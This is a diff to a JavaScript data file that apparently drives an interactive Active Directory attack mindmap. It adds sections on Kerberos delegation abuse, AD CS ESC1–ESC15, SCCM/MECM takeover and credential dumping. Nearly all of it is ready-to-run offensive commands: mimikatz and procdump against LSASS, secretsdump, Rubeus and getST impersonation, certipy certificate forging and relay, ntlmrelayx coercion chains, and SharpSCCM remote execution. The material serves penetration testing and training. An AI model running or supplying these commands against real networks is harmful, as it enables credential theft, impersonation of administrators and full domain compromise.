@@ -1293,6 +1293,1094 @@ var AD_MAP_V2 = {
           moveTo: []
         }
       ]
+    },
+
+    {
+      id: "kerberos-delegation",
+      title: "Kerberos Delegation",
+      color: "#26bd8a",
+      tag: "Impersonate via delegation",
+      desc: "Delegation lets one account act on behalf of another. Unconstrained, constrained, and resource-based delegation each offer a path to impersonate privileged users and reach SYSTEM or Domain Admin.",
+      techniques: [
+        {
+          id: "kd-find",
+          title: "Find delegation",
+          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-kerberos-delegation.html" },
+          cve: null,
+          desc: "Locate accounts and computers configured for delegation.",
+          cmds: [
+            "findDelegation.py \"<domain>/'<user>':'<password>'\""
+          ],
+          branches: [
+            { label: "BloodHound — unconstrained (computers)", cmds: ["MATCH (c:Computer {unconstraineddelegation:true}) RETURN c"] },
+            { label: "BloodHound — unconstrained (users)", cmds: ["MATCH (c:User {unconstraineddelegation:true}) RETURN c"] },
+            { label: "BloodHound — constrained", cmds: ["MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p"] },
+            { label: "BloodHound — path to a target", cmds: ['MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: "<MYTARGET.FQDN>"})) RETURN p'] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "kd-unconstrained",
+          title: "Unconstrained delegation",
+          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-kerberos-delegation.html" },
+          cve: null,
+          desc: "A host trusted for unconstrained delegation caches the TGT of anyone who authenticates to it (UAC flag ADS_UF_TRUSTED_FOR_DELEGATION). Coerce a DC to it, then dump the tickets.",
+          cmds: [],
+          branches: [
+            { label: "Force a connection with coercion, then dump tickets", cmds: [
+              "mimikatz privilege::debug sekurlsa::tickets /export",
+              "Rubeus.exe dump /service:krbtgt /nowrap",
+              "Rubeus.exe dump /luid:0xdeadbeef /nowrap",
+              "Rubeus.exe monitor /interval:5"
+            ], outcomes: [{ label: "Kerberos TGT", color: "#9ca3af" }, { label: "PassTheTicket", color: "#9ca3af" }] }
+          ],
+          outcomes: [],
+          moveTo: [{ section: "no-creds", label: "Coerce", note: "use a coercion technique to force the DC to authenticate" }]
+        },
+        {
+          id: "kd-constrained",
+          title: "Constrained delegation",
+          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-kerberos-delegation.html" },
+          cve: null,
+          desc: "An account with msDS-AllowedToDelegateTo can request tickets to the listed SPNs as any user via S4U.",
+          cmds: [],
+          branches: [
+            { label: "With protocol transition (TRUST_TO_AUTH_FOR_DELEGATION) — Rubeus", cmds: [
+              "Rubeus.exe hash /password:<password>",
+              "Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES256_hash>",
+              "Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt"
+            ], note: "S4U2self then S4U2proxy. Altservice can be HTTP / HOST / CIFS / LDAP.", outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] },
+            { label: "With protocol transition — Impacket", cmds: [
+              "getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>"
+            ], outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] },
+            { label: "Without protocol transition (TRUSTED_FOR_DELEGATION) — add computer", cmds: [
+              "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <domain_netbios> '<domain>/<user>:<password>'"
+            ], note: "Kerberos-only: constrain between Y and Z, add a computer X, set RBCD from X to Y, then chain S4U2self / S4U2proxy for a forwardable TGS." },
+            { label: "Without protocol transition — RBCD with the added computer", cmds: [
+              "rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' '<domain>/<constrained>$'",
+              "getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'",
+              "getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>"
+            ], outcomes: [{ label: "Kerberos TGS", color: "#9ca3af" }] },
+            { label: "Self RBCD", note: "Like RBCD but without adding a computer account." }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "kd-rbcd",
+          title: "Resource-Based Constrained Delegation (RBCD)",
+          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-kerberos-delegation.html" },
+          cve: null,
+          desc: "Write access to a target's msDS-AllowedToActOnBehalfOfOtherIdentity lets a computer you control impersonate any user to that target.",
+          cmds: [],
+          branches: [
+            { label: "Add a computer account", cmds: [
+              "addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host <domain_netbios> '<domain>/<user>:<password>'"
+            ] },
+            { label: "RBCD with the added computer — Rubeus", cmds: [
+              "Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>",
+              "Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES256_hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt"
+            ], outcomes: [{ label: "Admin", color: "#f4b6b6" }] },
+            { label: "RBCD with the added computer — Impacket", cmds: [
+              "rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' '<domain>/<user>:<password>'",
+              "getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>"
+            ], outcomes: [{ label: "Kerberos TGT", color: "#9ca3af" }, { label: "Admin", color: "#f4b6b6" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "kd-s4u2self",
+          title: "S4U2self abuse",
+          theory: { label: "Kerberos Delegation", url: "theory/2026-08-18-kerberos-delegation.html" },
+          cve: null,
+          desc: "With a machine account's key, request a service ticket to itself as any user (including a local admin) using S4U2self.",
+          cmds: [
+            "getTGT.py -dc-ip <dc_ip> -hashes :<machine_hash> \"<domain>/'<machine>$'\"",
+            "getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>/'<machine>$'\""
+          ],
+          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "adcs",
+      title: "AD CS (Certificate Services)",
+      color: "#c026d3",
+      tag: "ESC1–ESC15",
+      desc: "Active Directory Certificate Services misconfigurations (the ESC series). A vulnerable template, CA, or ACL lets you enrol a certificate as a privileged user and authenticate as them — often straight to Domain Admin.",
+      techniques: [
+        {
+          id: "adcs-enum",
+          title: "Enumeration",
+          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
+          cve: null,
+          desc: "Enumerate templates, CAs, and PKI objects to find the vulnerable ESC condition.",
+          cmds: [
+            "certutil -v -dsTemplate",
+            "certify.exe find [/vulnerable]",
+            "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>",
+            "ldeep ldap -u <user> -p <password> -d <domain> -s <dc_ip> templates",
+            "certify.exe pkiobjects",
+            "certutil -TCAInfo",
+            "certify.exe cas"
+          ],
+          outcomes: [
+            { label: "Web enrollment", color: "#c084fc" },
+            { label: "Vulnerable template", color: "#c084fc" },
+            { label: "Vulnerable CA", color: "#c084fc" },
+            { label: "Misconfigured ACL", color: "#c084fc" },
+            { label: "Vulnerable PKI Object AC", color: "#c084fc" }
+          ],
+          moveTo: []
+        },
+        {
+          id: "adcs-esc8",
+          title: "ESC8 — Web Enrollment is up",
+          theory: null,
+          cve: null,
+          desc: "Relay NTLM authentication to the CA web-enrollment endpoint, obtain a certificate for a privileged account, then authenticate with it.",
+          cmds: [],
+          branches: [
+            { label: "Relay with ntlmrelayx, then use the certificate", cmds: [
+              "ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController",
+              "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
+              "gettgtpkinit.py <domain>/<dc_name>$ <ccache_file>"
+            ] },
+            { label: "Relay with certipy", cmds: [
+              "certipy relay -target http://<ip_ca>",
+              "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
+            ] }
+          ],
+          outcomes: [{ label: "Pass the ticket", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "LDAP shell", color: "#9ca3af" }, { label: "Domain admin", color: "#ef4444" }],
+          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "coerce and relay authentication into the CA" }]
+        },
+        {
+          id: "adcs-templates",
+          title: "Misconfigured certificate template (ESC1/2/3/13/15)",
+          theory: null,
+          cve: null,
+          desc: "Templates that allow requester-supplied subject names or agent enrolment let you request a certificate as a privileged user.",
+          cmds: [],
+          branches: [
+            { label: "ESC1 — enrollee supplies subject (SAN)", cmds: [
+              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name> -upn <target_user>@<domain>",
+              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable_template>\" /altname:\"Admin\""
+            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] },
+            { label: "ESC2 — Any Purpose EKU", note: "The template can be used for any purpose — abuse it like ESC3.", outcomes: [{ label: "see ESC3", color: "#c084fc" }] },
+            { label: "ESC3 — Enrollment Agent", cmds: [
+              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable_template>\"",
+              "certify.exe request /ca:<server>\\<ca-name> /template:<template> /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> /enrollcertpw:<cert-password>",
+              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>"
+            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] },
+            { label: "ESC13 — issuance policy linked to a group", cmds: [
+              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name>",
+              "certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable_template>\""
+            ], outcomes: [{ label: "Pass the certificate (PKINIT)", color: "#9ca3af" }] },
+            { label: "ESC15 — EKUwu / application policies (v1 templates)", cmds: [
+              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<v1_template_with_enrollee_flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication'",
+              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<v1_template_with_enrollee_flag>' -ca <ca_name> --application-policies 'Certificate Request Agent'",
+              "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable_template>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>"
+            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "adcs-acl",
+          title: "Misconfigured ACL (ESC4/ESC7)",
+          theory: null,
+          cve: null,
+          desc: "Write access over a template or CA lets you make it vulnerable, exploit it, and restore it.",
+          cmds: [],
+          branches: [
+            { label: "ESC4 — write over a template → make it ESC1", cmds: [
+              "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -save-old -debug",
+              "certipy template -u <user>@<domain> -p '<password>' -template <vuln_template> -configuration <template>.json"
+            ], note: "Save the original config, weaken the template, exploit as ESC1, then restore.", outcomes: [{ label: "see ESC1", color: "#c084fc" }] },
+            { label: "ESC7 — Manage CA / Manage Certificates", cmds: [
+              "certipy ca -ca <ca_name> -add-officer '<user>' -username <user>@<domain> -password <password> -dc-ip <dc_ip> -target-ip <target_ip>",
+              "certipy ca -ca <ca_name> -enable-template '<esc1_vuln_template>' -username <user>@<domain> -password <password>",
+              "certipy req -username <user>@<domain> -password <password> -ca <ca_name> -template '<vulnerable_template>' -upn '<target_user>'",
+              "certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>",
+              "certipy req -u <user>@<domain> -p '<password>' -ca <ca_name> -retrieve <request_id>"
+            ], note: "Add yourself as an officer, enable a vulnerable template, request, then issue and retrieve the failed request.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "adcs-pki-object",
+          title: "Vulnerable PKI object access control (ESC5)",
+          theory: null,
+          cve: null,
+          desc: "Control over a PKI object (or the CA's private key) lets you forge certificates for anyone.",
+          cmds: [],
+          branches: [
+            { label: "ESC5 — vulnerable ACL on a PKI object", outcomes: [{ label: "ACL", color: "#3b9ee5" }] },
+            { label: "Golden certificate — steal the CA key and forge", cmds: [
+              "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
+              "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>"
+            ], outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "adcs-ca",
+          title: "Misconfigured Certificate Authority (ESC6/ESC11)",
+          theory: null,
+          cve: null,
+          desc: "A CA that honours requester-supplied SANs (ESC6) or accepts unauthenticated ICPR (ESC11) can be relayed to for a privileged certificate.",
+          cmds: [],
+          branches: [
+            { label: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA", note: "Choose any template that permits client authentication and supply the SAN, like ESC1.", outcomes: [{ label: "see ESC1", color: "#c084fc" }] },
+            { label: "ESC11 — relay to the RPC (ICPR) endpoint", cmds: [
+              "ntlmrelayx.py -t rpc://<ca_ip> -smb2support -rpc-mode ICPR -icpr-ca-name <ca_name>",
+              "Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt",
+              "gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>",
+              "certipy relay -target rpc://<ip_ca> -ca '<ca_name>'",
+              "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
+            ], outcomes: [{ label: "Pass the ticket", color: "#9ca3af" }, { label: "DCSYNC", color: "#3b82f6" }, { label: "Domain Admin", color: "#ef4444" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "adcs-mapping",
+          title: "Abuse certificate mapping (ESC9/ESC10/ESC14)",
+          theory: null,
+          cve: null,
+          desc: "Weak certificate-to-account mapping (implicit or explicit) lets a certificate for one account authenticate as another.",
+          cmds: [],
+          branches: [
+            { label: "ESC9 / ESC10 (implicit) — set shadow credentials, then hijack the UPN", cmds: [
+              "certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>",
+              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator"
+            ] },
+            { label: "ESC9 — request on the vulnerable template", cmds: [
+              "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable_template>"
+            ] },
+            { label: "ESC10 (case 1) — any template with client auth", cmds: [
+              "certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any_template_with_client_auth>"
+            ] },
+            { label: "ESC10 (case 2) — map to a DC UPN", cmds: [
+              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'"
+            ] },
+            { label: "Reset accountB's UPN afterwards", cmds: [
+              "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>"
+            ], note: "Kerberos mapping = ESC9/ESC10 case 1; Schannel mapping = ESC9/ESC10 case 2.", outcomes: [{ label: "Pass the certificate", color: "#9ca3af" }] }
+          ],
+          outcomes: [],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "sccm",
+      title: "SCCM / MECM",
+      color: "#a9d5b0",
+      tag: "Config Manager abuse",
+      desc: "System Center Configuration Manager (MECM) touches every managed host. Recon the hierarchy, loot Network Access Account credentials, relay site systems, and take over the site database for domain-wide execution.",
+      techniques: [
+        {
+          id: "sccm-recon",
+          title: "Recon",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Find SCCM site systems, management points, and distribution points.",
+          cmds: [
+            "sccmhunter.py find -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug",
+            "sccmhunter.py show -all",
+            "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
+            "nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "sccm-cred1",
+          title: "CRED-1 — No credentials (PXE)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Pull PXE boot media with no domain account (see the No Credentials → PXE technique) to recover deployment credentials.",
+          cmds: [],
+          outcomes: [{ label: "NAA credentials", color: "#4ade80" }, { label: "User + Pass", color: "#4ade80" }],
+          moveTo: [{ section: "no-creds", label: "PXE", note: "extract PXE boot media with no credentials" }]
+        },
+        {
+          id: "sccm-elevate1",
+          title: "ELEVATE-1 — Relay to site systems (simple user)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Coerce the SCCM site server and relay it to the other site systems.",
+          cmds: [
+            "ntlmrelayx.py -tf <site_systems> -smb2support -socks   # listen for the connection"
+          ],
+          outcomes: [{ label: "Admin on site system", color: "#4ade80" }],
+          moveTo: [{ section: "no-creds", label: "Coerce", note: "coerce the SCCM site server first" }]
+        },
+        {
+          id: "sccm-elevate2",
+          title: "ELEVATE-2 — Force client push (simple user)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Trigger client push installation so the push account authenticates to your relay.",
+          cmds: [
+            "ntlmrelayx.py -t <sccm_server> -smb2support -socks",
+            "SharpSCCM.exe invoke client-push -mp <sccm_server> -sc <site_code> -t <attacker_ip>   # launch client push install",
+            "proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>"
+          ],
+          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-elevate3",
+          title: "ELEVATE-3 — Automatic client push (simple user)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Register a fake computer, wait for automatic client push, and relay the push account's NTLM.",
+          cmds: [
+            "dnstool.py -u '<domain>\\<user>' -p <pass> -r <newcomputer>.<domain> -a add -t A -d <attacker_ip> <dc_ip>",
+            "setspn -D host/<newcomputer>.<domain> <newcomputer>   # remove the host SPN from the machine account",
+            "ntlmrelayx.py -tf <no_signing_target> -smb2support -socks   # wait ~5 min for client push"
+          ],
+          outcomes: [{ label: "Relay NTLM", color: "#ffe14a" }],
+          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "relay the captured client-push NTLM" }]
+        },
+        {
+          id: "sccm-cred6",
+          title: "CRED-6 — Loot creds from a distribution point",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Recover credentials from packages and policies hosted on a distribution point over SMB or HTTP.",
+          cmds: [],
+          branches: [
+            { label: "SMB service (445/TCP) on a DP", cmds: [
+              "cmloot.py <domain>/<user>:<password>@<sccm_dp> -cmlootinventory sccmfiles.txt"
+            ] },
+            { label: "HTTP service (80/443) on a DP", cmds: [
+              "SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$' -p '<machine_password>' -cn '<client_name>'",
+              "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'",
+              "sccm-http-looter -server <ip_dp>"
+            ] }
+          ],
+          outcomes: [{ label: "User + Pass", color: "#4ade80" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-takeover1",
+          title: "TAKEOVER-1 — Relay to the MSSQL database (simple user)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "When the site database is on a separate MSSQL host, coerce the SCCM server and relay it to MSSQL to add a site admin.",
+          cmds: [
+            "sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked",
+            "ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q <query>",
+            "sccmhunter.py admin -u <target_user>@<domain> -p <password> -ip <sccm_ip>"
+          ],
+          outcomes: [{ label: "SCCM ADMIN", color: "#4ade80" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-takeover2",
+          title: "TAKEOVER-2 — Relay to the MSSQL server (simple user)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Relay the coerced SCCM server to MSSQL and execute as the SCCM server machine account.",
+          cmds: [
+            "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
+            "proxychains smbexec.py -no-pass <domain>/<sccm_server>$@<sccm_ip>"
+          ],
+          outcomes: [{ label: "Admin MSSQL", color: "#f4b6b6" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-cred2",
+          title: "CRED-2 — Policy request credentials (simple user)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Register a device, request its machine policy, and decrypt the returned Network Access Account secret.",
+          cmds: [
+            "sccmwtf.py newcomputer newcomputer.<domain> <target> '<domain>\\<computer_added>$' '<computer_pass>'",
+            "policysecretunobfuscate.py   # get NetworkAccessUsername and NetworkAccessPassword",
+            "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>"
+          ],
+          outcomes: [{ label: "User + Pass", color: "#4ade80" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-cred34",
+          title: "CRED-3 / CRED-4 — Local admin on an SCCM host",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "With admin on an SCCM client or site system, dump stored DPAPI/NAA secrets locally.",
+          cmds: [
+            "dploot.py sccm -u <admin> -p '<password>' <sccm_target>",
+            "sccmhunter.py dpapi -u <admin> -p '<password>' -target <sccm_target> -debug",
+            "SharpSCCM.exe local secrets -m disk",
+            "SharpSCCM.exe local secrets -m wmi"
+          ],
+          outcomes: [{ label: "NAA credentials", color: "#4ade80" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-cred5",
+          title: "CRED-5 — SCCM admin (site database)",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "As an SCCM admin, dump the site server hash and read encrypted credentials straight from the site database.",
+          cmds: [
+            "secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>",
+            "mssqlclient.py -windows-auth -hashes :<sccm_target_hashNT> '<domain>/<sccm_target>$'@<sccm_mssql>",
+            "use CM_<site_code>;",
+            "SELECT * FROM SC_UserAccount",
+            "sccmdecryptpoc.exe <cyphered_value>"
+          ],
+          outcomes: [{ label: "Site DB credentials", color: "#9ca3af" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-exec",
+          title: "EXEC-1 / EXEC-2 — Execute as SCCM admin",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Push an application or script to managed devices for lateral execution.",
+          cmds: [
+            "SharpSCCM.exe exec -p <binary> -d <device_name> -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner",
+            "sccmhunter.py admin -u <user>@<domain> -p '<password>' -ip <sccm_ip>"
+          ],
+          outcomes: [{ label: "Lateral move", color: "#9ca3af" }],
+          moveTo: []
+        },
+        {
+          id: "sccm-cleanup",
+          title: "Cleanup",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "Remove the rogue device you registered during relay/push abuse.",
+          cmds: [
+            "SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier\"",
+            "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>"
+          ],
+          outcomes: [],
+          moveTo: []
+        },
+        {
+          id: "sccm-post",
+          title: "Post exploit",
+          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
+          cve: null,
+          desc: "As an SCCM admin, map user sessions across managed devices for targeting.",
+          cmds: [
+            "SCCMHound.exe --server <server> --sitecode <sitecode>"
+          ],
+          outcomes: [{ label: "User sessions", color: "#9ca3af" }],
+          moveTo: []
+        }
+      ]
+    },
+
+    {
+      id: "admin-access",
+      title: "Admin access (credential harvesting)",
+      color: "#f0c9bd",
+      tag: "Loot secrets",
+      desc: "You have local admin / SYSTEM on a host. Dump every credential store — LSASS, SAM, LSA, DPAPI — impersonate tokens, and collect anything reusable elsewhere.",
+      techniques: [
+        {
+          id: "aa-lsass",
+          title: "Extract credentials from LSASS",
+          theory: { label: "Credential Dumping" },
+          cve: null,
+          desc: "Dump the LSASS process for logon passwords, NT hashes, and Kerberos tickets.",
+          cmds: [],
+          branches: [
+            { label: "LSASS as a protected process (PPL)", cmds: [
+              "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp   # before the 2022-07-22 update",
+              'mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe" "!-"'
+            ] },
+            { label: "Extract LSASS secrets", cmds: [
+              "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+              'mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"',
+              "msf> load kiwi creds_all",
+              "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
+              "lsassy -d <domain> -u <user> -p <password> <ip>"
+            ] }
+          ],
+          outcomes: [{ label: "User + Pass", color: "#4ade80" }, { label: "NTLM", color: "#e8912e" }, { label: "PassTheHash", color: "#9ca3af" }, { label: "Clear text move", color: "#9ca3af" }],
+          moveTo: []
+        },
+        {
+          id: "aa-sam",
+          title: "Extract credentials from SAM",
+          theory: { label: "Credential Dumping" },
+          cve: null,
+          desc: "Dump local account hashes from the SAM hive.",
+          cmds: [
+            "nxc smb <ip_range> -u <user> -p <password> --sam",
+            "msf> hashdump",
+            'mimikatz "privilege::debug" "lsadump::sam" "exit"',
+            "secretsdump.py <domain>/<user>:<password>@<ip>",
+            "reg save HKLM\\SAM sam.save; reg save HKLM\\SYSTEM system.save   # then: secretsdump.py -system system.save -sam sam.save LOCAL",
+            "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'",
+            "regsecrets.py <domain>/<user>:<password>@<ip>"
+          ],
+          outcomes: [{ label: "NTLM", color: "#e8912e" }, { label: "PassTheHash", color: "#9ca3af" }],
+          moveTo: []
+        },
+        {
+          id: "aa-lsa",
+          title: "Extract credentials from LSA",
+          theory: { label: "Credential Dumping" },
+          cve: null,
+          desc: "Dump LSA secrets (service accounts, cached domain logons, machine account).",
+          cmds: [
+            "nxc smb <ip_range> -u <user> -p <password> --lsa",
+            'mimikatz "privilege::debug" "lsadump::lsa" "exit"',
+            "reg save HKLM\\SECURITY security.save; reg save HKLM\\SYSTEM system.save   # then: secretsdump.py -system system.save -security security.save LOCAL",
+            "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'"
+          ],
+          outcomes: [{ label: "MSCache 2", color: "#e8912e" }, { label: "User + Pass", color: "#4ade80" }],
+          moveTo: []
+        },
+        {
+          id: "aa-dpapi",
+          title: "Extract credentials from DPAPI",
+          theory: { label: "Credential Dumping" },
+          cve: null,
+          desc: "Recover browser passwords, cookies, and stored credentials protected by DPAPI.",
+          cmds: [],
+          branches: [
+            { label: "DPAPI", cmds: [
+              "nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]",
+              "donpapi <domain>/<user>:<password>@<target>",
+              "dpapidump.py <domain>/<user>:<password>@<target>"
+            ] },
+            { label: "Get the masterkey", cmds: [
+              'mimikatz "sekurlsa::dpapi"',
+              "lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys",
+              "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
+              "SharpDPAPI.exe triage"
+            ] },
+            { label: "Crack the user masterkey", cmds: [
+              "copy c:\\users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\<SID>",
+              "DPAPImk2john.py --preferred <prefered_file>",
+              "DPAPImk2john.py -c domain -mk <masterkey> -S <sid>"
+            ], outcomes: [{ label: "DPAPImk", color: "#e8912e" }] }
+          ],
+          outcomes: [{ label: "User + Pass", color: "#4ade80" }, { label: "PassTheHash", color: "#9ca3af" }, { label: "Clear text move", color: "#9ca3af" }],
+          moveTo: []
+        },
+        {
+          id: "aa-impersonate",
+          title: "Impersonate",
+          theory: { label: "Credential Dumping" },
+          cve: null,
+          desc: "Steal or impersonate the token / session of another logged-on user.",
+          cmds: [],
+          branches: [
+            { label: "Token impersonation", cmds: [
+              "msf> use incognito; impersonate_token <domain>\\<user>",
+              "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
+              "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
